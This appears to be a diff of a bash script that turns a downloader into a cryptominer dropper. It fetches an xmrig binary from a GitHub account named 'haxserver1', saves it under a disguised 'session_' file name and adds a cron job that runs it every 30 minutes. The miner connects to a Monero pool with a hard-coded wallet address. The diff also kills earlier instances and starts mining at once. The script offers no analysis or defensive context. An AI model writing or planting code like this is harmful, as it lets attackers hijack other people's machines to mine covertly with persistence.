@@ -1,16 +1,23 @@
 #!/bin/bash
 
+# Function to handle errors
+error_exit() {
+    echo "$1" 1>&2
+    exit 1
+}
+
 # Set the URL to download from
 URL="https://github.com/haxserver1/session_uia21jkjgz8719831bs9d1ba971283v/raw/main/xmrig"
 # Set the desired file name
 FILENAME="session_ajqysbey"
 # Lock file
 LOCKFILE="/tmp/${FILENAME}.lock"
+# Arguments to be used when running the script
+ARGS="-o pool.supportxmr.com:443 -u 48PMjoMcbA64NPR7ESQvRsKeDuVXA6AkVAr6LvEUCzxqBimsKvmxeYxN5Ys8htQ2NudViF8PVe8BHbT1eY5jWFXWQ1PB6fG -k --tls -p haxx"
 
-# Function to handle errors
-error_exit() {
-    echo "$1" 1>&2
-    exit 1
+# Function to kill existing instances
+kill_existing_instances() {
+    pkill -f "$FULL_PATH" && echo "Killed existing instances of $FULL_PATH" || echo "No existing instances of $FULL_PATH found"
 }
 
 # Download the file
@@ -35,8 +42,8 @@ fi
 # Get the full path to the downloaded file
 FULL_PATH="$(pwd)/$FILENAME"
 
-# Create the cron job entry
-CRON_JOB="*/30 * * * * flock -n $LOCKFILE $FULL_PATH"
+# Create the cron job entry with arguments
+CRON_JOB="*/30 * * * * $FULL_PATH $ARGS"
 
 # Add the cron job to the user's crontab
 echo "Adding cron job..."
@@ -45,8 +52,11 @@ if [ $? -ne 0 ]; then
     error_exit "Error: Failed to add cron job"
 fi
 
-# Create lock file only if cron job is successfully added
-touch "$LOCKFILE"
+# Ensure existing instances are killed before running the new one
+kill_existing_instances
+
+# Run the script with the arguments
+$FULL_PATH $ARGS
 
 echo "File downloaded to: $FULL_PATH"
 echo "Cron job added: $CRON_JOB"
